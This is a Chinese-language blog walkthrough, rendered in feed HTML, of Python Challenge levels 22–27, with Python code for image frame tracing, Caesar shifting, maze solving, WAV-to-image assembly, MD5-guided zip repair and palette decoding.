</span></span><br><span class="line">   <span class="comment">##     ##    ##     ##   ##          ##          ##          ##    ## </span></span><br><span class="line">    <span class="comment">#######      #######    ##          ##          #########   ##     ## </span></span><br><span class="line">      <span class="comment">###          ###      ##          ##          ##########  ##      ##</span></span><br></pre></td></tr></table></figure></p>
<p>其中四种情况的记录标志符“#\n”等这些可以自己设置，最后将其反转标志替换成回车\n，zlib标志替换成空字符，BZ标志替换成#即可打印出答案。</p>
<h3 id="python_challenge_22"><a href="http://www.pythonchallenge.com/pc/hex/copper.html" target="_blank" rel="external">python challenge 22</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/copper.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-22.jpg" alt="22"><br>查看页面源代码提示：or maybe white.gif would be more bright<br>将copper.html替换为white.gif显示一张黑色图片，黑的什么都看不到。<br>google大法说了每帧图上有一个不同的RGB点。<br>用ps打开，由于是gif动态图只能打开其中一帧，看看RGB全是(0,0,0)，鼠标晃晃就找到了那个不同的RGB(8,8,8)。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-22-white.jpg" alt="22-white"><br>然后我么把这张gif拆帧并将RGB(8,8,8)改为白色RGB(255,255,255),这样就能清晰的看到运动轨迹了。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-22-white-new.gif" alt="22-white-new"><br>如果上图白点不动的话刷新下页面，或者右键图片审查元素，拿到gif图片链接浏览器直接访问。<br>代码整理在github：<a href="https://github.com/idhyt/python_challenge/blob/master/modify_gif.py" target="_blank" rel="external">https://github.com/idhyt/python_challenge/blob/master/modify_gif.py</a><br>看到运动轨迹后思路就很清楚了，该动画总共133帧，白点围绕100,100左右微小变动，<br>联想这一关的图片（一个游戏操纵杆），把这些变动的点连接起来。<br>最后的结果显示通过操纵点的运动一共画出了5个字母的轮廓，所以当白点回归到中心的时候，就是画下一个字母的信号了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copper</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageSequence</span><br><span class="line">    org_img = Image.open(<span class="string">"img/white.gif"</span>)</span><br><span class="line">    new_img = Image.new(<span class="string">'RGB'</span>, org_img.size, <span class="string">"black"</span>)</span><br><span class="line">    new_img_draw = ImageDraw.Draw(new_img)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> ImageSequence.Iterator(org_img):</span><br><span class="line">        left, upper, right, lower = org_img.getbbox()</span><br><span class="line">        dx = left-<span class="number">100</span></span><br><span class="line">        dy = upper-<span class="number">100</span></span><br><span class="line">        x += dx</span><br><span class="line">        y += dy</span><br><span class="line">        <span class="keyword">if</span> dx == dy == <span class="number">0</span>:</span><br><span class="line">            x += <span class="number">20</span></span><br><span class="line">            y += <span class="number">30</span></span><br><span class="line">        new_img_draw.point((x, y))</span><br><span class="line"></span><br><span class="line">    new_img.save(<span class="string">"img/copper.png"</span>)</span><br></pre></td></tr></table></figure></p>
<p>最后生成图片中字母即为level23入口:bonus.html<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-22-copper.png" alt="22-copper"></p>
<h3 id="python_challenge_23"><a href="http://www.pythonchallenge.com/pc/hex/bonus.html" target="_blank" rel="external">python challenge 23</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/bonus.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-23.jpg" alt="23"><br>看网页源码提示：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">it can't find it. this is an undocumented module</span><br><span class="line">va gur snpr bs jung?</span><br></pre></td></tr></table></figure></p>
<p>va gur snpr bs jung?这段字符串想到了第二关的移位，由于不知道移几位，因此做个枚举<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bonus</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(str_value, shift_num)</span>:</span></span><br><span class="line">        ret_list = []</span><br><span class="line">        alphas = list(str_value)</span><br><span class="line">        <span class="keyword">for</span> alpha <span class="keyword">in</span> alphas:</span><br><span class="line">            temp_ord = ord(alpha) + shift_num</span><br><span class="line">            <span class="keyword">if</span> <span class="number">97</span> &lt;= temp_ord &lt;= <span class="number">122</span>:</span><br><span class="line">                ret_list.append(chr(temp_ord))</span><br><span class="line">            <span class="keyword">elif</span> temp_ord &gt; <span class="number">122</span>:</span><br><span class="line">                ret_list.append(chr(temp_ord - <span class="number">122</span> + <span class="number">96</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret_list.append(<span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join(ret_list)</span><br><span class="line"></span><br><span class="line">    org_str = <span class="string">"va gur snpr bs jung"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&gt;&gt;%d -&gt; %s"</span> % (i, shift(org_str, i))</span><br></pre></td></tr></table></figure></p>
<p>看输出信息：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;1 -&gt; wb hvs toqs ct kvoh</span><br><span class="line">&gt;&gt;2 -&gt; xc iwt uprt du lwpi</span><br><span class="line">&gt;&gt;3 -&gt; yd jxu vqsu ev mxqj</span><br><span class="line">&gt;&gt;4 -&gt; ze kyv wrtv fw nyrk</span><br><span class="line">&gt;&gt;5 -&gt; af lzw xsuw gx ozsl</span><br><span class="line">&gt;&gt;6 -&gt; bg max ytvx hy patm</span><br><span class="line">&gt;&gt;7 -&gt; ch nby zuwy iz qbun</span><br><span class="line">&gt;&gt;8 -&gt; di ocz avxz ja rcvo</span><br><span class="line">&gt;&gt;9 -&gt; ej pda bwya kb sdwp</span><br><span class="line">&gt;&gt;10 -&gt; fk qeb cxzb lc texq</span><br><span class="line">&gt;&gt;11 -&gt; gl rfc dyac md ufyr</span><br><span class="line">&gt;&gt;12 -&gt; hm sgd ezbd ne vgzs</span><br><span class="line">&gt;&gt;13 -&gt; in the face of what</span><br><span class="line">&gt;&gt;14 -&gt; jo uif gbdf pg xibu</span><br><span class="line">&gt;&gt;15 -&gt; kp vjg hceg qh yjcv</span><br><span class="line">&gt;&gt;16 -&gt; lq wkh idfh ri zkdw</span><br><span class="line">&gt;&gt;17 -&gt; mr xli jegi sj alex</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>循环右移13位的时候出现了正常的字符串in the face of what?这意思是this..<br>再看第一个提示this is an undocumented module，在python导入this模块试试<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">The Zen of Python, by Tim Peters</span><br><span class="line"></span><br><span class="line">Beautiful is better than ugly.</span><br><span class="line">Explicit is better than implicit.</span><br><span class="line">Simple is better than complex.</span><br><span class="line">Complex is better than complicated.</span><br><span class="line">Flat is better than nested.</span><br><span class="line">Sparse is better than dense.</span><br><span class="line">Readability counts.</span><br><span class="line">Special cases aren't special enough to break the rules.</span><br><span class="line">Although practicality beats purity.</span><br><span class="line">Errors should never pass silently.</span><br><span class="line">Unless explicitly silenced.</span><br><span class="line">In the face of ambiguity, refuse the temptation to guess.</span><br><span class="line">There should be one-- and preferably only one --obvious way to do it.</span><br><span class="line">Although that way may not be obvious at first unless you're Dutch.</span><br><span class="line">Now is better than never.</span><br><span class="line">Although never is often better than *right* now.</span><br><span class="line">If the implementation is hard to explain, it's a bad idea.</span><br><span class="line">If the implementation is easy to explain, it may be a good idea.</span><br><span class="line">Namespaces are one honking great idea -- let's do more of those!</span><br></pre></td></tr></table></figure></p>
<p>In the face of ambiguity, refuse the temptation to guess.<br>答案:ambiguity</p>
<h3 id="python_challenge_24"><a href="http://www.pythonchallenge.com/pc/hex/ambiguity.html" target="_blank" rel="external">python challenge 24</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/ambiguity.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-24.png" alt="24"><br>这一关的图片是一张迷宫地图(641, 641)，只不过白色部分是迷宫的墙，深色部分是路。<br>用ps查看像素点，可以看出墙部分的RGB=(255,255,255)，路的RGB=(x,0,0)。<br>根据标题from top to bottom的提示，入口就是图片的右上角，出口就是图片的左下角。<br>用ps看下右上角的入口点：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-24-1.jpg" alt="24-1"><br>因此最开始通过getpixel(x, 0)[0]=0 找到入口点位置。<br>同理左下角出口点通过getpixel(x, 640)[0]=0 找到。<br>代码逻辑：<br>1.从入口点开始向四个方向找下个坐标点，找到后作为下一个入口点，并将当前像素点标白(255,255,255)<br>2.如果找到两个以上的下个出口坐标，即到了分岔口，备份之前的坐标队列,以此分岔口作为新的入口点,<br>3.如果未找到出口，则退回到上个分岔口继续查找。</p>
<p>最后生成的图片可以看到完成的迷宫路径：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-24-2.png" alt="24-2"><br>显然这还不是谜底，在仔细观察迷宫的路径，可以发现每个一个像素点，路径上的颜色就会变化，<br>将这些像素点的R通道数据用二进制写到文件，打开可以发现前两位是PK ，那么这些信息其实是构成了一个ZIP文件。<br>更改后缀，解压，里面有两个文件，maze.jpg和mybroken.zip，其中maze.jpg图片上的lake就是谜底了。<br>完整代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ambiguity</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> Image</span><br><span class="line">    org_img = Image.open(<span class="string">"img/maze.png"</span>).getdata()</span><br><span class="line">    org_img_size = org_img.size</span><br><span class="line">    new_img = Image.new(<span class="string">"RGBA"</span>, org_img_size, <span class="string">"black"</span>)</span><br><span class="line">    start_pos, end_pos = <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    start_pos_count, end_pos_count = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(org_img_size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> org_img.getpixel((x, <span class="number">0</span>))[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            start_pos = (x, <span class="number">0</span>)</span><br><span class="line">            start_pos_count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> org_img.getpixel((x, org_img_size[<span class="number">1</span>]-<span class="number">1</span>))[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            end_pos = (x, org_img_size[<span class="number">1</span>]-<span class="number">1</span>)</span><br><span class="line">            end_pos_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> start_pos <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> end_pos <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> start_pos_count != <span class="number">1</span> <span class="keyword">or</span> end_pos_count != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[error] : get start pos or end pos error!"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] start_pos: %s and end_pos: %s"</span> % (start_pos, end_pos)</span><br><span class="line"></span><br><span class="line">    path = []</span><br><span class="line">    whole_path = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右 下 左 上</span></span><br><span class="line">    dire = [(<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, -<span class="number">1</span>)]</span><br><span class="line">    wall = (<span class="number">255</span>,)*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> start_pos != end_pos:</span><br><span class="line">        org_img.putpixel(start_pos, wall)</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        new_pos = start_pos</span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> dire:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                pp = (start_pos[<span class="number">0</span>]+offset[<span class="number">0</span>], start_pos[<span class="number">1</span>]+offset[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">if</span> org_img.getpixel(pp) != wall:</span><br><span class="line">                    flag += <span class="number">1</span></span><br><span class="line">                    new_pos = pp</span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">print</span> str(e)</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># 未找到下个出口</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> path:</span><br><span class="line">                path = whole_path.pop()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            start_pos = path[<span class="number">0</span>]</span><br><span class="line">            path = []</span><br><span class="line">        <span class="comment"># 分岔口,找到多个像素点,备份之前的坐标队列,以此分岔口作为新的入口点</span></span><br><span class="line">        <span class="keyword">elif</span> flag &gt; <span class="number">1</span>:</span><br><span class="line">            whole_path.append(path)</span><br><span class="line">            path = [start_pos]</span><br><span class="line">            start_pos = new_pos</span><br><span class="line">        <span class="comment"># 找到唯一出口,flag = 1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path.append(start_pos)</span><br><span class="line">            start_pos = new_pos</span><br><span class="line"></span><br><span class="line">    path.append(start_pos)</span><br><span class="line">    whole_path.append(path)</span><br><span class="line"></span><br><span class="line">    org_img = Image.open(<span class="string">"img/maze.png"</span>).getdata()</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> whole_path:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> path:</span><br><span class="line">            new_img.putpixel(k, wall)</span><br><span class="line">            data.append(org_img.getpixel(k)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    out = open(<span class="string">"files/out24.zip"</span>, <span class="string">"wb"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="number">1</span>::<span class="number">2</span>]:</span><br><span class="line">        out.write(chr(i))</span><br><span class="line">    out.close()</span><br><span class="line">    new_img.save(<span class="string">"img/out24.png"</span>)</span><br></pre></td></tr></table></figure></p>
<p>该题解迷宫逻辑参考<a href="http://blog.csdn.net/qaswe/article/details/9953133" target="_blank" rel="external">PythonChallenge 挑战之路 Level-24</a></p>
<h3 id="python_challenge_25"><a href="http://www.pythonchallenge.com/pc/hex/lake.html" target="_blank" rel="external">python challenge 25</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/lake.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-25.jpg" alt="25"><br>谷歌大法好：<br>这是一幅拼图模样的图片，根据网页源码里的提示can you see the waves?，这一关还要用到wave模块。<br>把URL后缀改为lake1.wav，lake2.wav，…，lake25会得到25个wav文件。<br>每个wav文件为10800字节，将三个作为一个像素，可得到一张10800/3=60x60大小的图片。<br>这25个wav文件对应着刚才的25块拼图，把这25个wav文件的内容依次拼起来，会得到一张300x300大小的图片。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">import</span> wave</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">            <span class="string">"Authorization"</span>: <span class="string">"Basic %s"</span> % base64.encodestring(<span class="string">"butter:fly"</span>).replace(<span class="string">"\n"</span>, <span class="string">""</span>)</span><br><span class="line">            &#125;</span><br><span class="line">    wave_url = <span class="string">'http://www.pythonchallenge.com/pc/hex/lake%i.wav'</span></span><br><span class="line">    new_img = Image.new(<span class="string">'RGB'</span>, (<span class="number">300</span>, <span class="number">300</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"%i/%i"</span> % (i + <span class="number">1</span>, <span class="number">25</span>)</span><br><span class="line">        wave_content = requests.get(wave_url % (i + <span class="number">1</span>), headers=headers).content</span><br><span class="line">        data = wave.open(StringIO.StringIO(wave_content))</span><br><span class="line">        patch = Image.fromstring(<span class="string">'RGB'</span>, (<span class="number">60</span>, <span class="number">60</span>), data.readframes(data.getnframes()))</span><br><span class="line">        pos = (<span class="number">60</span> * (i % <span class="number">5</span>), <span class="number">60</span> * (i / <span class="number">5</span>))</span><br><span class="line">        new_img.paste(patch, pos)</span><br><span class="line"></span><br><span class="line">    new_img.save(<span class="string">"img/out25.jpg"</span>)</span><br></pre></td></tr></table></figure></p>
<p>最终得到的图片中单词为最后答案：decent<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-25-decent.jpg" alt="25-decent"></p>
<h3 id="python_challenge_26"><a href="http://www.pythonchallenge.com/pc/hex/decent.html" target="_blank" rel="external">python challenge 26</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/decent.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-26.jpg" alt="26"><br>看网页源码中的提示：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>be a man - apologize!</span><br><span class="line"><span class="number">2.</span>yo<span class="string">u've got his e-mail</span><br><span class="line">3.Hurry up, I'</span>m missing the boat</span><br></pre></td></tr></table></figure></p>
<p>提示让你先发邮件去道歉，邮箱哪里来，看19关的源码中有段没有用到的记录：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">From: leopold.moz@pythonchallenge.com</span><br><span class="line">Subject: what do you mean by "open the attachment?"</span><br><span class="line">Mime-version: 1.0</span><br><span class="line">Content-type: Multipart/mixed; boundary="===============1295515792=="</span><br><span class="line"></span><br><span class="line">It is so much easier for you, youngsters.</span><br><span class="line">Maybe my computer is out of order.</span><br><span class="line">I have a real work to do and I must know what's inside!</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>找到邮箱leopold.moz@pythonchallenge.com，要道歉，发送内容是什么？<br>看23关源码中没有用到的记录：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TODO: do you owe someone an apology? now it is a good time to</span><br><span class="line">tell him that you are sorry. Please show good manners although</span><br><span class="line">it has nothing to do with this level.</span><br></pre></td></tr></table></figure></p>
<p>现在就可以去给leopold.moz@pythonchallenge.com发送内容为sorry的邮件。<br>python发邮件模块网上很多，就几行代码，这里我直接用我邮箱发，然后收到回复：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-26-sorry.jpg" alt="26-sorry"><br>从回复的邮件里得到了一个MD5值：bbb8b499a0eef99b52c7f13f4e78c24b以及<br>它提到的broken.zip文件。这个解压文件在24关中得到，在解压的时候会提示CRC效验失败，<br>也就是说缺少部分数据。但实际上用7z解压时候是可以解压出文件的。。但正常的过程应该是<br>这个MD5值应该就是那个broken.zip的MD5值，需要将原文件的每个字节枚举看得到的MD5<br>值是否为该MD5值，从而得到正确的文件。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def decent():</span><br><span class="line">    import hashlib</span><br><span class="line">    f_content = open("files/mybroken.zip", "rb").read()</span><br><span class="line">    for i in range(len(f_content)):</span><br><span class="line">        for j in range(256):</span><br><span class="line">            new_content = "".join([f_content[:i], chr(j), f_content[i+1:]])</span><br><span class="line">            if hashlib.md5(new_content).hexdigest() == "bbb8b499a0eef99b52c7f13f4e78c24b":</span><br><span class="line">                open("files/mybroken_new.zip", "wb").write(new_content)</span><br><span class="line">                print "offset %d -&gt; %d" % (i, j)</span><br><span class="line">&gt;&gt;&gt; offset 1234 -&gt; 168</span><br></pre></td></tr></table></figure></p>
<p>最后解压正确的zip文件得到一张图片<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-26-mybroken.gif" alt="26-mybroken"><br>将得到的单词speed和提示Hurry up,I’m missing the boat组合起来得到下关答案speedboat</p>
<h3 id="python_challenge_27"><a href="http://www.pythonchallenge.com/pc/hex/speedboat.html" target="_blank" rel="external">python challenge 27</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/speedboat.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-27.jpg" alt="27"><br>谷歌大法好，要利用调色板这些东西，调色板可参考<a href="http://www.360doc.com/content/10/0928/15/2790922_57060786.shtml" target="_blank" rel="external">调色板palette详解</a><br>首先查看源码，将zigzag.gif下载下来<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-27-zigzag.gif" alt="27-zigzag"><br>这时候每个像素的上的信息是调色板的索引号，然后就需要用实际的颜色替换索引号得到等价的图片信息。然后将这些数据与原图片信息对比，将不同的坐标点标记颜色，如新建一个黑底图片标白，最后得到一张图片。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-27-notword.png" alt="27-notword"><br>图片左边是not，右边是word，下边是busy?，中间是钥匙，合起来是not key word。<br>然后将两个图片不相同的字节放在一起，最后经过颜色替换索引号得到的图片不同的数据得到一个bz压缩文件，解压出来并找到那些关键字里面哪些不是key word打印出，最后得到答案。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">speedboat</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> Image</span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    <span class="keyword">import</span> bz2</span><br><span class="line">    <span class="keyword">import</span> keyword</span><br><span class="line">    img = Image.open(<span class="string">"img/zigzag.gif"</span>)</span><br><span class="line">    img_content = img.tostring()</span><br><span class="line">    img_plt = img.palette.getdata()[<span class="number">1</span>][::<span class="number">3</span>]</span><br><span class="line">    trans = string.maketrans(<span class="string">""</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]), img_plt)</span><br><span class="line">    img_tran = img_content.translate(trans)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># compare</span></span><br><span class="line">    diff = [<span class="string">""</span>, <span class="string">""</span>]</span><br><span class="line">    img = Image.new(<span class="string">"1"</span>, img.size, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(img_content)):</span><br><span class="line">        <span class="keyword">if</span> img_content[i] != img_tran[i-<span class="number">1</span>]:</span><br><span class="line">            diff[<span class="number">0</span>] += img_content[i]</span><br><span class="line">            diff[<span class="number">1</span>] += img_tran[i-<span class="number">1</span>]</span><br><span class="line">            img.putpixel(((i-<span class="number">1</span>) % img.size[<span class="number">0</span>], (i-<span class="number">1</span>)/img.size[<span class="number">0</span>]), <span class="number">1</span>)</span><br><span class="line">    img.save(<span class="string">"img/out27.png"</span>)</span><br><span class="line">    text = bz2.decompress(diff[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># extract key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text.split():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> keyword.iskeyword(i):</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line"></span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>../ring/bell.html</span><br><span class="line">    repeat</span><br><span class="line">    switch</span><br><span class="line">    repeat</span><br><span class="line">    ../ring/bell.html</span><br><span class="line">    ../ring/bell.html</span><br><span class="line">    ../ring/bell.html</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></p>
<p>得到28关链接为<a href="http://www.pythonchallenge.com/pc/ring/bell.htm" target="_blank" rel="external">http://www.pythonchallenge.com/pc/ring/bell.htm</a><br>账户名repeat 密码是 switch</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>继续斗智斗勇中。已经开始谷歌大法好了。。</p>
